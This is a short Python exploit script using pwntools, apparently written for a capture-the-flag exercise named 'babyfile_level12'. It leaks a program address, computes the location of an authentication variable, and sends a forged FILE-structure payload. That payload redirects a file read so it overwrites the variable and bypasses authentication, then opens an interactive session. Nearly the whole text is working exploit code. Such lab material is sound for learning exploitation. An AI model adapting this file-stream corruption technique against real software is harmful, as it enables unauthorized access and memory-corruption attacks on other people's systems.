from pwn import * 

p = process('./babyfile_level12')

s = '''
b * fwrite
'''


p.recvuntil("is located at: ")
main_addr = int(p.recvline().strip(), 16)
print("main address @ ", hex(main_addr))

auth = main_addr - 0x205d + 0x05170

p.sendline("open_file")
p.sendline("new_note 0 248")


p.sendline("write_fp")

offset_to_buf_base = 0x8 * 7
payload = b'\x00' * offset_to_buf_base
payload += p64(auth)
payload += p64(auth + 0x100)
payload += b'\x00' * (0x8 * 5)
payload += p64(0)




p.sendline(payload)


p.sendline(b"read_file 0")
#p.recvuntil("> ")
#p.sendline("0")

# Add this line to wait for the next prompt
p.sendline(b'1' * 248)


gdb.attach(p, s)
time.sleep(1) 

p.sendline("authenticate")

p.interactive()
